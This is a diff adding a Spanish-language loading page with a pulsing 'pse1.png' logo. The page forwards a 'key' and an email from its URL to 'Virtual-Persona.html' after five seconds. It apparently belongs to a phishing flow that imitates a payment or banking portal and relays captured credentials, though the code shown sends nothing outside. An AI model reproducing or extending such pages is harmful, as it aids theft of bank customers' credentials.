@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cargando...</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #fff;
+    }
+
+    img {
+      width: 150px;
+      transition: transform 0.6s ease-in-out;
+    }
+
+    .pulse {
+      transform: scale(1.1);
+    }
+  </style>
+</head>
+<body>
+  <img id="logo" src="img/pse1.png" alt="Cargando...">
+
+  <script>
+    // Función para obtener parámetros de la URL
+    function getParam(name) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(name);
+    }
+
+    const key = getParam("key");
+    const correo = getParam("correo");
+
+    const logo = document.getElementById("logo");
+
+    // Efecto palpitación
+    setInterval(() => {
+      logo.classList.toggle("pulse");
+    }, 600);
+
+    // Redirección a los 5 segundos con las variables recibidas
+    setTimeout(() => {
+      window.location.href = "Virtual-Persona.html?key=" + encodeURIComponent(key) + "&correo=" + encodeURIComponent(correo);
+    }, 5000);
+  </script>
+</body>
+</html>
